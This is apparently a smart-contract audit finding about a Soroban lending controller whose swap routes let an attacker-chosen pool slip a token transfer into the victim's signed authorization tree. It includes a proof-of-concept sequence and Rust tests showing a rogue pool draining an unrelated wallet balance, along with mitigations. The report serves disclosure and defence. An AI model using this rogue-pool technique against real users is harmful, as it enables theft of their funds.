### Title
Attacker-controlled route venue can piggyback on the caller's authorization tree to steal unrelated wallet tokens - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
Controller strategy entrypoints accept opaque route payloads and invoke the configured swap router below the caller's `require_auth` context. Although the controller grants only one exact input transfer from its own balance, the router resolves pool addresses from the payload without an allowlist. A malicious pool called below that authorization can invoke `token.transfer(victim, attacker, amount)`. Transaction simulation records that transfer as a child of the victim's controller authorization; if the victim signs the simulated tree, the host authorizes the theft even though the victim never knowingly authorized that token call.

### Finding Description
`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` accept attacker-constructed `swap` bytes. In `swap_collateral`, the caller is authenticated and bound to the account before `withdraw_and_swap_from_supply` reaches `swap_tokens` [1](#0-0) . `swap_tokens` forwards the opaque payload to the configured router after authorizing one exact input transfer [2](#0-1) .

The router decodes a caller-supplied address registry and packed instruction stream [3](#0-2) . Each swap instruction constructs `SwapHop.pool` directly from that registry and dispatches it to a venue adapter [4](#0-3) . For example, the Soroswap adapter invokes methods on the payload-selected `pool` address [5](#0-4) . No storage-backed venue or pool allowlist limits this address.

The included security test demonstrates the resulting Soroban authorization behavior: a rogue pool's `token.transfer(victim, attacker, amount)` is recorded as a child under the victim's `swap_collateral` authorization and executes when that simulated tree is signed [6](#0-5) . The same test proves that signing the poisoned tree transfers the victim's entire unrelated wallet-token balance to the attacker [7](#0-6) .

### Impact Explanation
An attacker can steal arbitrary token balances from a user who signs a maliciously simulated route, including assets unrelated to the lending position and unbounded by `total_in`, route `min_out`, measured output, or the final account risk check. This is theft of user funds.

### Likelihood Explanation
The attacker needs to convince a user to execute a crafted route through an attacker-controlled pool address and sign the resulting authorization tree. No privileged role, leaked key, contract upgrade, or protocol parameter manipulation is required. The malicious child authorization can be hidden inside a route payload presented as a normal controller strategy call.

### Recommendation
Constrain route execution so payload-selected pools cannot execute under the user's broad invocation authorization. Prefer an explicit governance allowlist of venue pool contracts. If arbitrary pools remain supported, isolate venue calls under the router's own authorization and prevent route-called code from consuming the original caller's authorization tree. At minimum, reject any simulated authorization tree containing calls other than the expected exact input transfer, but this client-side check should not be the sole mitigation.

### Proof of Concept
1. Deploy `RogueHopPool` with a plan containing `(victim, unrelated_wallet_token, attacker, victim_balance)`. Its `swap` method executes `token::Client::new(&unrelated_wallet_token).transfer(&victim, &attacker, &victim_balance)`.
2. Craft a swap payload whose `assets` registry uses the rogue contract as the hop `pool`, with a normal listed `token_in` and `token_out` and a fair `min_out`.
3. Have the victim call `controller.swap_collateral(caller=victim, account_id, current, amount, new, swap)` or directly execute the equivalent router strategy.
4. During simulation, the host records `wallet_token.transfer(victim -> attacker, victim_balance)` as a child invocation under the victim's strategy authorization.
5. If the victim signs that tree, the rogue pool spends the unrelated wallet balance while the strategy itself still returns the expected output and passes the controller's final risk checks.

This exact sequence is implemented by `UnlistedPoolRouter`, `RogueHopPool`, and the enforcing-auth test in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`; the enforced transaction leaves the victim's wallet balance at zero and credits the attacker with `WALLET_BALANCE` [8](#0-7) .

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
